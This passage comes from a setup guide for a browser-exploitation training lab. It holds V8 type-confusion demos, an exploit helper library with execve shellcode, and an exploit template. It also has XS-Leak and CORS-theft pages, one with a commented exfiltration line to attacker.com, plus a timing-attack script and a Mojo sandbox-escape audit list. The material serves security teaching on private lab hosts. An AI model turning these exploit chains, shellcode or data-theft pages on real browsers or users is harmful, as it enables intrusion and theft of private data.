  }
}).listen(3004, '0.0.0.0', () => console.log('Fingerprint lab on :3004'));
STATIC

# === Start all apps ===
cat > /opt/browser-lab/start_all.sh << 'START'
#!/bin/bash
cd /opt/browser-lab/apps
node xsleak-target.js &
node extension-test.js &
node cookie-lab.js &
node sw-lab/server.js &
node static-server.js &
node spectre-checker.js &
echo "All browser lab apps started on ports 3000-3005"
START
chmod +x /opt/browser-lab/start_all.sh

# === V8 exploitation exercise files ===
mkdir -p /opt/browser-lab/v8-exercises

cat > /opt/browser-lab/v8-exercises/01_type_confusion_demo.js << 'V8_TC'
// V8 Type Confusion Demonstration
// Run with: d8 --allow-natives-syntax --trace-deopt 01_type_confusion_demo.js
//
// This demonstrates the CONCEPT of V8 type confusion exploitation
// without relying on a specific CVE. Uses V8 intrinsics for educational clarity.

// === Understanding V8 Object Representation ===

// Create arrays with different element kinds
var double_arr = [1.1, 2.2, 3.3, 4.4];
var obj_arr = [{}, {}, {}, {}];

// Inspect internal representation
%DebugPrint(double_arr);  // PACKED_DOUBLE_ELEMENTS
%DebugPrint(obj_arr);     // PACKED_ELEMENTS

console.log("\n=== Array Element Kinds ===");
console.log("double_arr elements kind:", %HasDoubleElements(double_arr) ? "DOUBLE" : "OTHER");
console.log("obj_arr elements kind:", %HasObjectElements(obj_arr) ? "OBJECT" : "OTHER");

// === Map Transitions ===
var obj1 = {};
%DebugPrint(obj1);
console.log("\n=== Map Transitions ===");
console.log("Before property addition:");
console.log("  Map ID:", %HaveSameMap(obj1, {}) ? "same as {}" : "different");

obj1.x = 1;
%DebugPrint(obj1);
console.log("After adding .x:");
console.log("  Map ID:", %HaveSameMap(obj1, {x: 1}) ? "same as {x:1}" : "different");

obj1.y = 2;
%DebugPrint(obj1);

// === Type Feedback and Optimization ===
function add(a, b) {
  return a + b;
}

// Train with integers (SMI)
for (var i = 0; i < 10000; i++) {
  add(i, i + 1);
}

// Force optimization
%OptimizeFunctionOnNextCall(add);
console.log("\n=== Optimization ===");
console.log("add(1, 2) =", add(1, 2));
console.log("Optimized:", %GetOptimizationStatus(add) & 16 ? "YES" : "NO");

// Deoptimize by passing unexpected type
console.log("add('x', 'y') =", add('x', 'y'));
console.log("Still optimized:", %GetOptimizationStatus(add) & 16 ? "YES" : "NO");

// === Elements Kind Transition Lattice ===
console.log("\n=== Elements Kind Lattice ===");
var arr = [1, 2, 3];
console.log("Initial (SMI):", %HasSmiElements(arr));

arr.push(1.5);
console.log("After push(1.5) — DOUBLE:", %HasDoubleElements(arr));

arr.push({});
console.log("After push({}) — OBJECT:", %HasObjectElements(arr));
// Cannot go back to SMI or DOUBLE — lattice is one-directional

// === Float64 ↔ Address Conversion Utilities ===
// These are the building blocks of addrof/fakeobj primitives
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var bi64 = new BigInt64Array(buf);

function ftoi(val) {
  f64[0] = val;
  return bi64[0];
}

function itof(val) {
  bi64[0] = val;
  return f64[0];
}

function ftoi32(val) {
  f64[0] = val;
  return [u32[0], u32[1]]; // [low, high]
}

console.log("\n=== Float64 ↔ Integer Conversion ===");
f64[0] = 1.1;
console.log("1.1 as hex:", "0x" + bi64[0].toString(16));
console.log("1.1 as uint32 pair:", "low=0x" + u32[0].toString(16), "high=0x" + u32[1].toString(16));

// === Simulated addrof (using V8 intrinsics) ===
// In a real exploit, this would use a TurboFan type confusion bug
// Here we use V8 debug intrinsics to demonstrate the concept
function simulated_addrof(obj) {
  // %DebugPrint shows the address — parse it
  // In a real exploit: type confusion reads object pointer as float64
  return "Use %DebugPrint(obj) to see the heap address";
}

var target = { secret: "FLAG{v8_type_confusion}" };
console.log("\n=== Simulated addrof ===");
console.log("Target object:");
%DebugPrint(target);

// === Understanding V8 Sandbox ===
console.log("\n=== V8 Sandbox Status ===");
console.log("V8 Sandbox enabled:", typeof WebAssembly !== 'undefined' ? 'check with --sandbox-testing' : 'N/A');

// Demonstrate external pointer table concept
var ab = new ArrayBuffer(64);
console.log("ArrayBuffer created — backing store is an external pointer");
%DebugPrint(ab);
// In sandboxed V8: ab stores an EPT index, not a raw pointer
// Corrupting the EPT index only redirects to another EPT entry of the same type

console.log("\n=== Summary ===");
console.log("Key takeaways:");
console.log("1. V8 uses Maps (hidden classes) for object layout optimization");
console.log("2. Element kinds form a one-directional lattice (SMI→DOUBLE→OBJECT)");
console.log("3. TurboFan speculates on types and inserts deopt guards");
console.log("4. Type confusion = wrong speculation + missing/bypassed guard");
console.log("5. addrof: read pointer as float64 (leak address)");
console.log("6. fakeobj: write float64 as pointer (create fake object)");
console.log("7. V8 Sandbox adds EPT/CPT/TPT indirection to block exploitation");
V8_TC

cat > /opt/browser-lab/v8-exercises/02_addrof_fakeobj_concept.js << 'V8_AF'
// addrof / fakeobj Primitive Concept Demonstration
// Run with: d8 --allow-natives-syntax 02_addrof_fakeobj_concept.js
//
// This demonstrates the canonical V8 exploitation primitives.
// NO real vulnerability — uses V8 intrinsics to simulate the effect.

// === Utility: Float64 ↔ BigInt conversion ===
var conversion_buf = new ArrayBuffer(8);
var f64_view = new Float64Array(conversion_buf);
var u64_view = new BigInt64Array(conversion_buf);

function ftoi(f) { f64_view[0] = f; return u64_view[0]; }
function itof(i) { u64_view[0] = i; return f64_view[0]; }

// === CONCEPT: addrof primitive ===
// In a real exploit, a TurboFan bug confuses element kinds:
// TurboFan reads obj_arr[0] (a tagged pointer) as if it were
// float_arr[0] (a raw float64). The pointer bits are returned
// as a float64 value.
//
// Simulated here with %DebugPrint address extraction:

function conceptual_addrof(target_obj) {
  // REAL EXPLOIT would do:
  //   var float_arr = [1.1, 2.2];
  //   var obj_arr = [target_obj];
  //   // Trigger type confusion via CVE-specific optimization bug
  //   // TurboFan reads obj_arr[0] as float64
  //   var leaked_float = confused_read(obj_arr, 0);
  //   return ftoi(leaked_float);

  // SIMULATION: V8 intrinsic to show what the address looks like
  console.log("--- %DebugPrint output (contains heap address) ---");
  %DebugPrint(target_obj);
  console.log("--- end ---");
  console.log("In a real exploit, addrof() returns the heap address as a BigInt.");
  return 0n; // placeholder
}

// === CONCEPT: fakeobj primitive ===
// The dual of addrof: write a controlled float64 (encoding an address)
// into a slot that TurboFan reads as a tagged pointer.
// V8 returns a JavaScript object "at" the attacker-chosen address.

function conceptual_fakeobj(addr_bigint) {
  // REAL EXPLOIT would do:
  //   var float_arr = [1.1, 2.2];
  //   var obj_arr = [{}];
  //   var addr_float = itof(addr_bigint);
  //   // Trigger type confusion: write float into pointer slot
  //   confused_write(obj_arr, 0, addr_float);
  //   var fake = obj_arr[0]; // V8 treats the float bits as a pointer
  //   return fake;

  console.log("fakeobj would create a JS object at address 0x" + addr_bigint.toString(16));
  console.log("Requires: valid Map pointer + elements pointer at that address");
  return null; // placeholder
}

// === CONCEPT: Arbitrary R/W from addrof + fakeobj ===
function conceptual_arb_rw_explanation() {
  console.log(`
=== Arbitrary Read/Write Construction ===

Step 1: Leak addresses
  float_arr_addr = addrof(float_arr)     // address of a PACKED_DOUBLE_ELEMENTS array
  float_arr_map  = read(float_arr_addr)  // its Map pointer
  float_arr_elem = read(float_arr_addr + 0x08) // its elements pointer

Step 2: Craft fake array in known memory (e.g., inside an ArrayBuffer)
  var craft_buf = new ArrayBuffer(0x100);
  var dv = new DataView(craft_buf);
  var craft_buf_addr = addrof(craft_buf);
  var backing_store = read_backing_store(craft_buf_addr);

  // Write fake FixedDoubleArray header at offset 0x00
  dv.setUint32(0x00, fixedDoubleArrayMap, true);
  dv.setUint32(0x04, smi(0xFFFF), true);       // enormous length

  // Write fake JSArray header at offset 0x40
  dv.setUint32(0x40, float_arr_map, true);      // same Map as float_arr
  dv.setUint32(0x44, emptyFixedArray, true);    // properties
  dv.setUint32(0x48, backing_store, true);      // elements → fake FixedDoubleArray
  dv.setUint32(0x4C, smi(0xFFFF), true);        // length

Step 3: Create fake JSArray via fakeobj
  var arb = fakeobj(backing_store + 0x40n);
  // arb[N] now reads/writes at (backing_store + 8 + N*8) as float64
  // With the inflated length, this accesses arbitrary contiguous memory.

Step 4: Read/write anywhere
  function arb_read(addr) {
    // Set the fake elements backing store to (addr - 0x10)
    // so arb[0] reads at addr
    dv.setUint32(0x48, compress(addr - 0x10n), true);
    return ftoi(arb[0]);
  }
  function arb_write(addr, value) {
    dv.setUint32(0x48, compress(addr - 0x10n), true);
    arb[0] = itof(value);
  }
  `);
}

// === CONCEPT: Wasm RWX shellcode injection ===
function conceptual_wasm_shellcode_explanation() {
  console.log(`
=== Wasm RWX Page Shellcode Injection ===

Step 1: Create a trivial Wasm module
  var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,...]);
  var wasm_mod = new WebAssembly.Module(wasm_code);
  var wasm_inst = new WebAssembly.Instance(wasm_mod);
  var wasm_func = wasm_inst.exports.main;

Step 2: Locate JIT code page via arbitrary read
  wasm_inst_addr = addrof(wasm_inst);
  instance_data  = arb_read(wasm_inst_addr + WASM_INSTANCE_DATA_OFFSET);
  rwx_addr       = arb_read(instance_data + JUMP_TABLE_START_OFFSET);

Step 3: Write shellcode via arbitrary write
  // Linux x86-64 execve("/bin/sh") shellcode
  shellcode = [0x48,0x31,0xf6, 0x56, 0x48,0xbf,0x2f,0x62,0x69,0x6e,
               0x2f,0x73,0x68,0x00, 0x57, 0x48,0x89,0xe7,
               0x48,0x31,0xd2, 0xb0,0x3b, 0x0f,0x05];
  for (i = 0; i < shellcode.length; i++) {
    arb_write8(rwx_addr + BigInt(i), shellcode[i]);
  }

Step 4: Trigger shellcode execution
  wasm_func(); // jumps to overwritten code → execve("/bin/sh")

NOTE: Modern V8 (Chrome 111+) uses W^X for Wasm code pages.
Exploitation requires: mprotect via ROP, or V8 Sandbox bypass
to corrupt Code Pointer Table entries.
  `);
}

// === Run demonstrations ===
console.log("====== V8 Exploitation Primitives — Conceptual Demo ======\n");

var target = { secret: "sensitive_data", id: 42 };
conceptual_addrof(target);
console.log("");
conceptual_fakeobj(0xDEADBEEFn);
console.log("");
conceptual_arb_rw_explanation();
conceptual_wasm_shellcode_explanation();

// === V8 Heap Sandbox impact ===
console.log(`
=== V8 Heap Sandbox Impact on Exploitation ===

Pre-sandbox (Chrome < 123):
  addrof → leak raw C++ pointer → directly read/write process memory

Post-sandbox (Chrome 123+):
  addrof → leak 32-bit compressed pointer (cage-relative offset)
  External pointers → indices into External Pointer Table (EPT)
  Code pointers → indices into Code Pointer Table (CPT)

New exploitation requirements:
  1. Corrupt EPT entry to redirect an external pointer
     → must match the type tag (16-bit discriminator)
  2. Corrupt CPT entry to redirect JIT code execution
     → must point within V8's code space
  3. Corrupt Trusted Pointer Table (TPT) to forge a context object
  4. Overwrite Wasm jump table entry (if reachable from sandbox)

The sandbox RAISES THE BAR — it does NOT prevent all exploitation.
V8 sandbox bypass is now a required step in modern Chrome full chains.
`);
V8_AF

# === Nginx config for serving labs ===
cat > /etc/nginx/sites-available/browser-lab << 'NGINX_CONF'
server {
    listen 8080;
    server_name _;

    # Fingerprint lab
    location /fingerprint {
        alias /opt/browser-lab/apps/;
        index fingerprint-lab.html;
    }

    # V8 exercise files
    location /v8/ {
        alias /opt/browser-lab/v8-exercises/;
    }

    # Proxy to Node apps
    location /xsleak/ {
        proxy_pass http://127.0.0.1:3000/;
    }
    location /ext/ {
        proxy_pass http://127.0.0.1:3001/;
    }
    location /cookies/ {
        proxy_pass http://127.0.0.1:3002/;
    }
    location /sw/ {
        proxy_pass http://127.0.0.1:3003/;
    }
    location /spectre/ {
        proxy_pass http://127.0.0.1:3005/;
    }
}
NGINX_CONF
ln -sf /etc/nginx/sites-available/browser-lab /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

echo "[VM1] Browser internals lab host setup complete."
echo "  XS-Leak target:      http://10.8.1.10:3000"
echo "  Extension test:      http://10.8.1.10:3001"
echo "  Cookie lab:          http://10.8.1.10:3002"
echo "  ServiceWorker lab:   http://10.8.1.10:3003"
echo "  Fingerprint lab:     http://10.8.1.10:3004"
echo "  Spectre checker:     http://10.8.1.10:3005"
echo "  V8 exercises:        /opt/browser-lab/v8-exercises/"
```

### VM2 — Attacker / Analysis Workstation (10.8.1.20)

```bash
#!/usr/bin/env bash
# vm2_attacker_setup.sh — Browser exploitation analysis tools
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get install -y \
  build-essential git curl wget python3 python3-pip python3-venv \
  gdb gdb-multiarch strace ltrace \
  cmake ninja-build clang llvm \
  nodejs npm jq nmap \
  tshark tcpdump mitmproxy \
  binutils-dev libunwind-dev \
  yara libyara-dev \
  swift rustc cargo

pip3 install --break-system-packages \
  frida-tools objection \
  pwntools ropper \
  selenium playwright \
  yara-python requests aiohttp \
  mitmproxy

# === Browser fuzzing tools ===
mkdir -p /opt/fuzzing

# Domato — DOM/rendering fuzzer
git clone https://github.com/googleprojectzero/domato.git /opt/fuzzing/domato

# Fuzzilli — JS engine fuzzer
git clone https://github.com/googleprojectzero/fuzzilli.git /opt/fuzzing/fuzzilli

# Dharma — grammar-based browser fuzzer
git clone https://github.com/MozillaSecurity/dharma.git /opt/fuzzing/dharma

# wasm-tools (includes wasm-smith for Wasm fuzzing)
cargo install wasm-tools --root /opt/fuzzing

# === V8 exploitation helper library ===
cat > /opt/v8_exploit_helpers.py << 'V8HELPERS'
#!/usr/bin/env python3
"""
V8 Exploitation Helper Library

Utilities for V8 type confusion exploit development, address conversion,
shellcode generation, and Wasm module crafting. Educational use only within
authorized security research and CTF contexts.
"""

import struct
import subprocess
import os
import json
from dataclasses import dataclass, field
from typing import Optional

# === Float64 ↔ Integer conversion ===

def ftoi(f: float) -> int:
    """Convert IEEE 754 float64 to unsigned 64-bit integer."""
    return struct.unpack('<Q', struct.pack('<d', f))[0]

def itof(i: int) -> float:
    """Convert unsigned 64-bit integer to IEEE 754 float64."""
    return struct.unpack('<d', struct.pack('<Q', i & 0xFFFFFFFFFFFFFFFF))[0]

def ftoi32(f: float) -> tuple:
    """Convert float64 to pair of uint32 (low, high)."""
    raw = struct.pack('<d', f)
    low, high = struct.unpack('<II', raw)
    return (low, high)

def p64(val: int) -> bytes:
    """Pack 64-bit little-endian."""
    return struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF)

def u64(data: bytes) -> int:
    """Unpack 64-bit little-endian."""
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]

def p32(val: int) -> bytes:
    """Pack 32-bit little-endian."""
    return struct.pack('<I', val & 0xFFFFFFFF)

def u32(data: bytes) -> int:
    """Unpack 32-bit little-endian."""
    return struct.unpack('<I', data.ljust(4, b'\x00'))[0]

# === V8 Pointer Compression ===

V8_CAGE_SIZE = 4 * 1024 * 1024 * 1024  # 4 GB cage

def compress_ptr(full_ptr: int, cage_base: int) -> int:
    """Compress a 64-bit V8 heap pointer to 32-bit offset."""
    return (full_ptr - cage_base) & 0xFFFFFFFF

def decompress_ptr(compressed: int, cage_base: int) -> int:
    """Decompress a 32-bit V8 compressed pointer."""
    return (cage_base + compressed) & 0xFFFFFFFFFFFFFFFF

def smi(val: int) -> int:
    """Encode an integer as a V8 Small Integer (Smi). Smi = val << 1."""
    return (val << 1) & 0xFFFFFFFF

def unsmi(encoded: int) -> int:
    """Decode a V8 Smi to integer."""
    return encoded >> 1

# === Wasm Module Generation ===

def minimal_wasm_module() -> bytes:
    """Generate a minimal valid Wasm module with one exported function."""
    return bytes([
        0x00, 0x61, 0x73, 0x6d,  # magic: \0asm
        0x01, 0x00, 0x00, 0x00,  # version 1
        # Type section: one function type () -> ()
        0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
        # Function section: function 0 has type 0
        0x03, 0x02, 0x01, 0x00,
        # Export section: export "main" = function 0
        0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
        # Code section: function body = nop + end
        0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
    ])

def wasm_module_with_memory(pages: int = 1) -> bytes:
    """Generate Wasm module with linear memory."""
    import io
    buf = io.BytesIO()
    # Magic + version
    buf.write(b'\x00\x61\x73\x6d\x01\x00\x00\x00')
    # Type section: () -> (i32)
    buf.write(bytes([0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f]))
    # Function section
    buf.write(bytes([0x03, 0x02, 0x01, 0x00]))
    # Memory section: min=pages, max=pages
    buf.write(bytes([0x05, 0x04, 0x01, 0x01, pages, pages]))
    # Export section: "mem" = memory 0, "load" = function 0
    mem_name = b'mem'
    func_name = b'load'
    exports = bytes([
        0x02,  # 2 exports
        len(mem_name)] + list(mem_name) + [0x02, 0x00,  # memory export
        len(func_name)] + list(func_name) + [0x00, 0x00  # function export
    ])
    buf.write(bytes([0x07, len(exports)]) + exports)
    # Code section: i32.load offset=0 (loads from address 0)
    body = bytes([0x05, 0x00, 0x41, 0x00, 0x28, 0x02, 0x00, 0x0b])
    buf.write(bytes([0x0a, len(body) + 1, 0x01]) + body)
    return buf.getvalue()

# === Shellcode Templates ===

SHELLCODE_LINUX_X64_EXECVE_SH = bytes([
    0x48, 0x31, 0xf6,                          # xor rsi, rsi
    0x56,                                        # push rsi
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,        # movabs rdi, "/bin/sh\0"
    0x2f, 0x73, 0x68, 0x00,
    0x57,                                        # push rdi
    0x48, 0x89, 0xe7,                            # mov rdi, rsp
    0x48, 0x31, 0xd2,                            # xor rdx, rdx
    0xb0, 0x3b,                                  # mov al, 59 (sys_execve)
    0x0f, 0x05                                   # syscall
])

SHELLCODE_LINUX_X64_REVERSE_SHELL = lambda ip, port: bytes([
    0x48, 0x31, 0xff,                            # xor rdi, rdi
    0x6a, 0x02,                                  # push 2
    0x58,                                        # pop rax (socket)
    0x48, 0x89, 0xc6,                            # etc. (abbreviated — use msfvenom for full)
])

# === JavaScript Exploit Template Generator ===

def generate_addrof_fakeobj_template(cve_id: str = "CVE-XXXX-XXXX") -> str:
    """Generate a JavaScript template for addrof/fakeobj exploitation."""
    return f"""
// V8 Type Confusion Exploit Template — {cve_id}
// Requires: V8 version with unfixed vulnerability
// Context: renderer process exploitation

// === Conversion utilities ===
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u64 = new BigInt64Array(buf);
var u32 = new Uint32Array(buf);

function ftoi(f) {{ f64[0] = f; return u64[0]; }}
function itof(i) {{ u64[0] = i; return f64[0]; }}

// === Arrays for type confusion ===
var float_arr = [1.1, 2.2, 3.3, 4.4];
var obj_arr = [{{a:1}}, {{b:2}}, {{c:3}}, {{d:4}}];

// === CVE-specific trigger function ===
// TODO: Replace with actual vulnerability trigger
function trigger_confusion(arr, idx) {{
  // This function must be JIT-compiled by TurboFan
  // with incorrect type speculation that confuses
  // PACKED_DOUBLE_ELEMENTS and PACKED_ELEMENTS
  return arr[idx];
}}

// === Warmup: train TurboFan ===
for (var i = 0; i < 100000; i++) {{
  trigger_confusion(float_arr, 0);
}}

// === addrof primitive ===
function addrof(obj) {{
  obj_arr[0] = obj;
  var leaked = trigger_confusion(obj_arr, 0);
  return ftoi(leaked);
}}

// === fakeobj primitive ===
function fakeobj(addr) {{
  var val = itof(addr);
  // Dual trigger function needed for write direction
  // trigger_write(obj_arr, 0, val);
  return obj_arr[0];
}}

// === Build arbitrary R/W ===
// (see 02_addrof_fakeobj_concept.js for full chain)

console.log("Exploit template loaded for " + "{cve_id}");
"""

# === PartitionAlloc Analysis ===

@dataclass
class PartitionAllocBucket:
    size_class: int
    slot_size: int
    slots_per_span: int
    freelist_encoding: str = "XOR(raw_next, cookie, slot_addr)"

def partitionalloc_size_classes() -> list:
    """Return PartitionAlloc size classes up to 1024 bytes."""
    classes = []
    for size in [16, 32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256,
                 320, 384, 448, 512, 640, 768, 896, 1024]:
        page_size = 4096
        slots_per_span = page_size // size
        classes.append(PartitionAllocBucket(
            size_class=size,
            slot_size=size,
            slots_per_span=slots_per_span
        ))
    return classes

def find_size_class(alloc_size: int) -> int:
    """Find the PartitionAlloc size class for a given allocation size."""
    for cls in partitionalloc_size_classes():
        if cls.size_class >= alloc_size:
            return cls.size_class
    return alloc_size  # direct-map for large allocations

# === V8 Sandbox Analysis ===

@dataclass
class V8SandboxLayout:
    cage_base: int = 0
    cage_size: int = 4 * 1024 * 1024 * 1024  # 4 GB
    ept_offset: int = 0  # External Pointer Table offset from cage base
    cpt_offset: int = 0  # Code Pointer Table offset
    tpt_offset: int = 0  # Trusted Pointer Table offset

    def in_cage(self, addr: int) -> bool:
        return self.cage_base <= addr < self.cage_base + self.cage_size

    def describe(self) -> str:
        return f"""
V8 Heap Sandbox Layout:
  Cage base:  0x{self.cage_base:016x}
  Cage end:   0x{self.cage_base + self.cage_size:016x}
  Cage size:  {self.cage_size // (1024*1024*1024)} GB
  EPT offset: 0x{self.ept_offset:08x}
  CPT offset: 0x{self.cpt_offset:08x}
  TPT offset: 0x{self.tpt_offset:08x}

External Pointer Table (EPT):
  Entry format: [pointer (48 bits)] | [tag (16 bits)]
  Tags: kArrayBufferBackingStoreTag, kExternalStringResourceTag, etc.
  Access: read index from V8 object → lookup EPT[index] → check tag → use pointer

Code Pointer Table (CPT):
  Entry format: pointer to executable code
  Validation: must point within V8 code space
  Corruption impact: redirects JIT function calls

Trusted Pointer Table (TPT):
  Entry format: pointer to trusted V8 internal objects
  Contains: NativeContext, ScopeInfo pointers
"""

if __name__ == '__main__':
    print("=== V8 Exploitation Helper Library ===\n")

    # Float conversion demo
    print("Float64 ↔ Integer conversions:")
    print(f"  1.1 → 0x{ftoi(1.1):016x}")
    print(f"  0x{ftoi(1.1):016x} → {itof(ftoi(1.1))}")
    print(f"  Smi(42) = 0x{smi(42):08x}")
    print(f"  unsmi(0x{smi(42):08x}) = {unsmi(smi(42))}")

    # PartitionAlloc
    print("\nPartitionAlloc size classes:")
    for cls in partitionalloc_size_classes():
        print(f"  {cls.size_class:4d} bytes — {cls.slots_per_span} slots/span")

    # Size class lookup
    for sz in [24, 50, 100, 200, 500]:
        print(f"  Allocation {sz} bytes → size class {find_size_class(sz)}")

    # V8 Sandbox
    sandbox = V8SandboxLayout(cage_base=0x100000000000)
    print(sandbox.describe())

    # Wasm module
    wasm = minimal_wasm_module()
    print(f"Minimal Wasm module: {len(wasm)} bytes")
    print(f"  Header: {wasm[:4].hex()} (magic) {wasm[4:8].hex()} (version)")
V8HELPERS
chmod +x /opt/v8_exploit_helpers.py

# === XS-Leak exploitation scripts ===
mkdir -p /opt/xsleak-tools

cat > /opt/xsleak-tools/frame_count_leak.html << 'XSLEAK_FRAME'
<!DOCTYPE html>
<html>
<head><title>XS-Leak: Frame Count Oracle</title></head>
<body>
  <h1>XS-Leak: Frame Count Side Channel</h1>
  <p>Detects whether the user is logged in as admin on the target
  by counting the number of frames in the cross-origin window.</p>

  <div id="status">Testing...</div>
  <div id="result"></div>

  <script>
    const TARGET = 'http://10.8.1.10:3000';

    async function frameCountLeak() {
      const status = document.getElementById('status');
      const result = document.getElementById('result');

      // Open target in a new window
      status.textContent = 'Opening target window...';
      const win = window.open(TARGET + '/dashboard', '_blank');

      // Wait for page to load
      await new Promise(r => setTimeout(r, 2000));

      try {
        // Cross-origin: cannot read DOM, but CAN read window.frames.length
        const frameCount = win.frames.length;

        status.textContent = 'Frame count detected: ' + frameCount;

        if (frameCount === 3) {
          result.innerHTML = '<b style="color:red">User is ADMIN</b> — dashboard has 3 iframes (stats, users, logs)';
        } else if (frameCount === 0) {
          result.innerHTML = '<b>User is NOT admin</b> — redirected to profile/login (0 frames)';
        } else {
          result.innerHTML = 'Unexpected frame count: ' + frameCount;
        }
      } catch(e) {
        result.innerHTML = 'Error: ' + e.message;
      }

      win.close();
    }

    // Mitigations that would block this:
    // - X-Frame-Options: DENY on dashboard
    // - Cross-Origin-Opener-Policy: same-origin (prevents window.open access)
    // - CSP frame-ancestors 'none'

    frameCountLeak();
  </script>
</body>
</html>
XSLEAK_FRAME

cat > /opt/xsleak-tools/timing_leak.py << 'XSLEAK_TIMING'
#!/usr/bin/env python3
"""
XS-Leak: Timing Side-Channel Attack

Exploits the timing difference in the /api/search endpoint to extract
the number of matching users character by character.

The target endpoint deliberately sleeps proportional to result count,
simulating a real-world scenario where database query time correlates
with the number of returned rows.
"""

import requests
import time
import string
import statistics

TARGET = "http://10.8.1.10:3000"
SESSION_COOKIE = ""  # Set after authentication

def authenticate():
    """Login and extract session cookie."""
    global SESSION_COOKIE
    s = requests.Session()
    s.post(f"{TARGET}/login", data={"username": "admin", "password": "secret123"})
    SESSION_COOKIE = s.cookies.get("session", "")
    print(f"[+] Authenticated. Session: {SESSION_COOKIE[:16]}...")
    return s

def measure_timing(session, query, samples=5):
    """Measure average response time for a search query."""
    times = []
    for _ in range(samples):
        start = time.perf_counter()
        resp = session.get(f"{TARGET}/api/search", params={"q": query})
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return statistics.median(times)

def extract_users(session):
    """Extract usernames character by character via timing side-channel."""
    print("\n[*] Extracting usernames via timing oracle...")
    print("[*] Baseline timing (empty query):")
    baseline = measure_timing(session, "")
    print(f"    Empty query: {baseline*1000:.1f}ms (all users match)")

    found_prefixes = []

    for char in string.ascii_lowercase:
        t = measure_timing(session, char)
        count_estimate = round(t / 0.050)  # 50ms per result
        if count_estimate > 0:
            print(f"    '{char}': {t*1000:.1f}ms → ~{count_estimate} users starting with '{char}'")
            found_prefixes.append((char, count_estimate))

    print("\n[+] Detected user prefixes:")
    for prefix, count in found_prefixes:
        print(f"    '{prefix}' → {count} user(s)")

    # Deep extraction for found prefixes
    print("\n[*] Deep extraction (2-character prefixes):")
    for prefix, _ in found_prefixes:
        for char2 in string.ascii_lowercase:
            query = prefix + char2
            t = measure_timing(session, query, samples=3)
            count_estimate = round(t / 0.050)
            if count_estimate > 0:
                print(f"    '{query}': ~{count_estimate} match(es)")

def main():
    session = authenticate()
    extract_users(session)

    print("\n[*] Mitigations:")
    print("  1. Constant-time responses (pad/delay to fixed duration)")
    print("  2. Rate limiting on search endpoints")
    print("  3. COOP: same-origin (prevents cross-origin window access)")
    print("  4. SameSite=Strict cookies (prevents cross-site requests)")

if __name__ == '__main__':
    main()
XSLEAK_TIMING
chmod +x /opt/xsleak-tools/timing_leak.py

cat > /opt/xsleak-tools/cors_exploit.html << 'CORS_EXPLOIT'
<!DOCTYPE html>
<html>
<head><title>CORS Misconfiguration Exploit</title></head>
<body>
  <h1>CORS Misconfiguration: Reflected Origin</h1>
  <p>The target reflects any Origin header in Access-Control-Allow-Origin
  with credentials enabled — allowing any origin to read the response.</p>

  <div id="result"></div>

  <script>
    const TARGET = 'http://10.8.1.10:3000/api/sensitive';

    // This works because the server reflects our origin:
    // Access-Control-Allow-Origin: <attacker origin>
    // Access-Control-Allow-Credentials: true
    fetch(TARGET, { credentials: 'include' })
      .then(r => r.json())
      .then(data => {
        document.getElementById('result').innerHTML =
          '<pre>Stolen data:\n' + JSON.stringify(data, null, 2) + '</pre>';
        // In a real attack: exfiltrate to attacker server
        // navigator.sendBeacon('https://attacker.com/steal', JSON.stringify(data));
      })
      .catch(e => {
        document.getElementById('result').textContent = 'Error: ' + e.message +
          '\n\nNote: User must be authenticated on the target first.';
      });
  </script>

  <h2>Why This Works</h2>
  <pre>
Server response headers:
  Access-Control-Allow-Origin: https://attacker.com   ← reflects our origin
  Access-Control-Allow-Credentials: true              ← sends cookies

Correct fix:
  Access-Control-Allow-Origin: https://trusted.example.com  ← allowlist
  OR
  Do not reflect the Origin header without validation
  </pre>
</body>
</html>
CORS_EXPLOIT

# === Mojo interface enumeration script ===
cat > /opt/mojo_audit.py << 'MOJO_AUDIT'
#!/usr/bin/env python3
"""
Mojo Interface Audit Tool

Enumerates known Mojo interfaces from Chromium source and provides
an audit framework for identifying sandbox escape vectors.

Educational/research use only within authorized contexts.
"""

import json
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class MojoInterface:
    name: str
    mojom_path: str
    available_to: str  # "web_content", "extension", "webui", "service_worker"
    privileged_operations: list = field(default_factory=list)
    risk_level: str = "LOW"
    notes: str = ""

# Known high-interest Mojo interfaces reachable from web content renderers
KNOWN_INTERFACES = [
    MojoInterface(
        name="blink::mojom::BlobRegistry",
        mojom_path="third_party/blink/public/mojom/blob/blob.mojom",
        available_to="web_content",
        privileged_operations=["Register blob URLs", "Create blob handles"],
        risk_level="MEDIUM",
        notes="CVE: blob URL origin spoofing (Issue 1062091)"
    ),
    MojoInterface(
        name="blink::mojom::CodeCacheHost",
        mojom_path="third_party/blink/public/mojom/loader/code_cache.mojom",
        available_to="web_content",
        privileged_operations=["Read/write code cache"],
        risk_level="LOW"
    ),
    MojoInterface(
        name="network::mojom::RestrictedCookieManager",
        mojom_path="services/network/public/mojom/restricted_cookie_manager.mojom",
        available_to="web_content",
        privileged_operations=["Read/write cookies for origin"],
        risk_level="MEDIUM",
        notes="Restricted to same-origin cookies. Bypass = cookie theft."
    ),
    MojoInterface(
        name="blink::mojom::FileSystemManager",
        mojom_path="third_party/blink/public/mojom/filesystem/file_system.mojom",
        available_to="web_content",
        privileged_operations=["Create/read/write sandboxed filesystem"],
        risk_level="HIGH",
        notes="CVE-2019-13768: path validation bypass → arbitrary file access"
    ),
    MojoInterface(
        name="device::mojom::SensorProvider",
        mojom_path="services/device/public/mojom/sensor_provider.mojom",
        available_to="web_content",
        privileged_operations=["Access device sensors"],
        risk_level="LOW",
        notes="Requires permission grant. TOCTOU risk in permission check."
    ),
    MojoInterface(
        name="blink::mojom::LockManager",
        mojom_path="third_party/blink/public/mojom/locks/lock_manager.mojom",
        available_to="web_content",
